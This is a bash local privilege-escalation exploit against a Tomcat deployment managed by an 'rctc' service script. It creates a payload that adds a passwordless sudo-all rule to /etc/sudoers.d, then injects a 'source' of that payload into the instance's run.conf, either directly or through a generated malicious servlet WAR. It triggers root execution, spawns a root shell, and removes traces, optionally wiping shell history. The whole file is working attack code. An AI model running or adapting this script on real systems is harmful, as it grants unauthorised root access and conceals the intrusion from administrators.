#!/bin/bash
#set -x

ETNHOME="/home/etndevel"
RUN_CONF="run.conf"
PAYLOAD="/tmp/rctc_exploit.sh"
SUDO_EXPLOIT="/etc/sudoers.d/exploit"
TC_BASE="/srv/tc"
WARTMP="$ETNHOME/temp"
JAVAEXPL="RctcServlet.java"
MANIFEST="MANIFEST.MF"
JAVAWEBXML="web.xml"
WAR="rctc.war"
SLEEP_T=20
INSTANCE="$1"
OP="$2"
LINK="$3"
URL="$4"
CLEAN_HISTFILE=0

function print_line {
	local msg="$1"
	echo -e "$msg"
}

function print_error {
	local msg="$1"
	local symbol="-"
	echo "[$symbol] $msg"
}

function print_good {
	local msg="$1"
	local symbol="*"
	echo "[$symbol] $msg"
}

function print_status {
	local msg="$1"
	local symbol="+"
	echo "[$symbol] $msg"
}

function usage {
	print_line "$0 [tomcat instance] [operation] [symlink] [URL] "
	print_line "\t\t\t tomcat instance - instance of tomcat"
	print_line "\t\t\t operation - what to do [clean] or code inject method [sudo] or [war]"
	print_line "\t\t\t link - application symlink in war folder i.e. koop.war"
	print_line "\t\t\t url - url where rctc servlet can be accessed i.e. http://koop.koop-jnp-dev-1.mit.etn.cz"
	exit 0
}

function create_payload {
	print_status "creating payload"
	echo "echo \"etndevel ALL=(ALL)     NOPASSWD: ALL\" >> $SUDO_EXPLOIT" >> "$PAYLOAD"
	echo "chmod 440 /etc/sudoers.d/exploit >> $SUDO_EXPLOIT" >> "$PAYLOAD"
}

function source_payload_as_appusr {
	print_status "chusr to tc$INSTANCE"
	sudo -n -u tc$INSTANCE sh -c "echo \"source $PAYLOAD\" >> $TC_BASE/$INSTANCE/$RUN_CONF"
	print_status "injecting payload" 

}

function clean_exploit {
	rm -rf "$PAYLOAD"
	rm -rf "$SUDO_EXPLOIT"
	sed -i 's/source.*//g' "$TC_BASE/$INSTANCE/$RUN_CONF"

	rctc restart $INSTANCE >/dev/null
}

function generate_war {
	print_status "generating war ..."
	print_status "base structure (1/3)"
	generate_war_structure
	print_status "code (2/3)"
	generate_war_code
	print_status "web.xml (3/3)"
	generate_war_webxml
}

function generate_war_structure {
	if [ -d "$WARTMP" ]; then
		rm -rf "$WARTMP"
	fi
	mkdir "$WARTMP"
	mkdir "$WARTMP/META-INF"
	mkdir "$WARTMP/WEB-INF"
	mkdir "$WARTMP/WEB-INF/classes"
	mkdir "$WARTMP/WEB-INF/classes/mypackage"
	mkdir "$WARTMP/WEB-INF/lib"
}

function generate_war_code {
	cat > "$WARTMP/WEB-INF/classes/mypackage/$JAVAEXPL" <<EOFJAVA
package mypackage;

import java.io.*;
import static java.nio.file.StandardOpenOption.*;
import java.nio.file.*;

import javax.servlet.http.*;
import javax.servlet.*;

public class RctcServlet extends HttpServlet {
  public void doGet (HttpServletRequest req, HttpServletResponse res)
    throws ServletException, IOException
  {
    
    String expinj = "source /tmp/rctc_exploit.sh";
    byte data[] = expinj.getBytes();
    Path p = Paths.get("/srv/tc/XXXINSTANCEXXX/run.conf");

    try (OutputStream out = new BufferedOutputStream(
      Files.newOutputStream(p, CREATE, APPEND))) {
      out.write(data, 0, data.length);

      PrintWriter out2 = res.getWriter();
	  out2.println("Code injected!");
      out2.close();
    } catch (IOException x) {
      System.err.println(x);
    }
  }
}

EOFJAVA

sed -i "s/XXXINSTANCEXXX/$INSTANCE/g" "$WARTMP/WEB-INF/classes/mypackage/$JAVAEXPL"
}

function generate_war_webxml {
cat > "$WARTMP/WEB-INF/$JAVAWEBXML" <<EOFJAVAXML
<?xml version="1.0" encoding="ISO-8859-1"?>
<web-app xmlns="http://java.sun.com/xml/ns/j2ee"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
    version="2.4">

    <display-name>Hello, World Application</display-name>
    <description>
        This is a simple web application with a source code organization
        based on the recommendations of the Application Developer\'s Guide.
    </description>

    <servlet>
        <servlet-name>RctcServlet</servlet-name>
        <servlet-class>mypackage.RctcServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>RctcServlet</servlet-name>
        <url-pattern>/rctc</url-pattern>
    </servlet-mapping>

</web-app>

EOFJAVAXML

}

function compile_war {
	if [ -x /usr/bin/locate ]; then
		JAVAC=$(locate javac | grep "java-1.7.0/bin/")
		SERVLET=$(locate servlet-api.jar | grep "tomcat-7.0")
		JAR=$(locate jar | grep -E "java-1.7.0/bin/jar$")
	else
		print_error "locate not found!"
		exit 1
	fi
	if [ -z "$JAVAC" ] || [ -z "$SERVLET" ] || [ -z "$JAR" ]; then
		print_error "compilation error (something is missing)!"
	fi

	print_status "compiling war"
	$JAVAC -cp $CLASSPATH:$SERVLET "$WARTMP/WEB-INF/classes/mypackage/$JAVAEXPL"
	rm -rf "$WARTMP/WEB-INF/classes/mypackage/$JAVAEXPL"
	cd "$WARTMP"
	$JAR -cvf "$WAR" . >/dev/null
	cd "$ETNHOME"
	cp "$WARTMP/$WAR" "$TC_BASE/$INSTANCE/war/"
	cd "$TC_BASE/$INSTANCE/war/"
	print_status "creating TC war symlink ($LINK -> $WAR)"
	OLDWAR=$(ls -la | grep $LINK | awk '{print $NF}')
	ln -sf "$WAR" "$LINK"
	cd "$ETNHOME"
}

function clean_temp {
	rm -rf "$WARTMP"
	if [ $OP == "war" ]; then
		sudo -n -u root sh -c "rm -rf \"$TC_BASE/$INSTANCE/war/$WAR\""
		cd "$TC_BASE/$INSTANCE/war/"
		sudo -n -u root sh -c "ln -sf \"$OLDWAR\" \"$LINK\""
		cd "$ETNHOME"
	fi
}

if [ -z "$INSTANCE" ]; then
	usage
fi

if [ -n "$OP" ]; then
	if [ "$OP" == "clean" ]; then
		print_status "cleaning exploit"
		clean_exploit
		exit
	elif [ "$OP" == "sudo" ]; then
		create_payload
		source_payload_as_appusr
	elif [ "$OP" == "war" ]; then
		if [ -z "$URL" ] || [ -z "$LINK" ]; then 
			usage
		fi
		create_payload
		generate_war
		compile_war
		print_status "Deploying war (sleep $SLEEP_T)"
		rctc restart $INSTANCE &>/dev/null
		sleep $SLEEP_T
		print_status "requesting application"
		wget "$URL/rctc" -o /dev/null -O /dev/null
		grep -q source "$TC_BASE/$INSTANCE/$RUN_CONF"
		if [ $? -eq 1 ]; then
			print_error "source injection in run.conf not found! Try manual injection."
			exit 1
		fi
	else
		usage
	fi
else
	usage
fi

print_good "trying get root (thread-dump method)"
rctc thread-dump "$INSTANCE" &>/dev/null
sudo -n -u root sh -c "echo \"[!] Got root, spawning shell ...\""
# make sure nobody notice :)
print_status "cleaning"
clean_temp
if [ $CLEAN_HISTFILE -eq 1 ]; then
	echo > "$ETNHOME/.bash_history"
fi
print_good "run $ETNHOME/$0 $INSTANCE clean"
sudo -n -i
